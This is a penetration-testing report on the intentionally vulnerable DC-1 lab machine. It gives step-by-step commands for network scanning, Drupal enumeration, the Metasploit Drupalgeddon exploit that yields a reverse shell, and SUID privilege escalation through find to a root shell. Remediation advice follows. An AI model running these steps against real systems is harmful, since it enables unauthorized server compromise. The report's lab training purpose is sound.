# Penetration Testing Report – DC-1

## Target Information

| Field | Details |
|---|---|
| Machine Description | A deliberately vulnerable lab machine for practicing web application exploits, privilege escalation, and post-exploitation techniques. |
| Target IP | `192.168.0.119` |
| Vulnerability Name | Drupal CMS Remote Code Execution, SUID Misconfiguration |
| Port / Service | `HTTP 80 / Drupal` |
| Severity | High (8.4) |
| Attack Vector | `CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

---

# Proof of Concept (PoC)

## Step 1 – Discover Target IP

```bash
nmap -sn 192.168.0.0/24
```

![Step 1](images/step1.png)

---

## Step 2 – Scan Open Ports and Services

```bash
nmap -p- -sC -sV 192.168.0.119 --open
```

![Step 2](images/step2.png)

---

## Step 3 – Enumerate Drupal Version

Using Droopescan, possible Drupal versions were identified.

```bash
droopescan scan drupal -u http://192.168.0.119
```

![Step 3](images/step3.png)

---

## Step 4 – Search for Exploit in Metasploit

A suitable exploit module was searched in Metasploit.

```bash
search drupal
```

![Step 4](images/step4.png)

---

## Step 5 – Select Exploit Module

The appropriate Drupal exploit module was selected.

```bash
use exploit/unix/webapp/drupal_drupageddon
```

![Step 5](images/step5.png)

---

## Step 6 – Execute Exploit

The exploit was executed successfully and a reverse shell was obtained.

```bash
run
```

![Step 6](images/step6.png)

---

## Step 7 – Privilege Escalation Using SUID

The `find` binary was discovered with SUID permissions and abused for privilege escalation.

```bash
find / -perm -4000 2>/dev/null
```

Example privilege escalation:

```bash
find . -exec /bin/sh -p \; -quit
```

![Step 7](images/step7.png)

---

# Remediation

- Update Drupal CMS to the latest secure version.
- Apply all official Drupal security patches.
- Disable or remove vulnerable/outdated plugins and modules.
- Restrict access to the admin panel using MFA and IP filtering.
- Audit all SUID binaries regularly.
- Remove unnecessary SUID permissions.

---

# Impact

- Full website compromise.
- Arbitrary command execution on the server.
- Installation of malware or backdoors.
- Unauthorized access to sensitive data.
- Privilege escalation to root.
- Complete system compromise.

---

# References

- https://www.acunetix.com/blog/web-security-zone/drupalgeddon2/
- https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
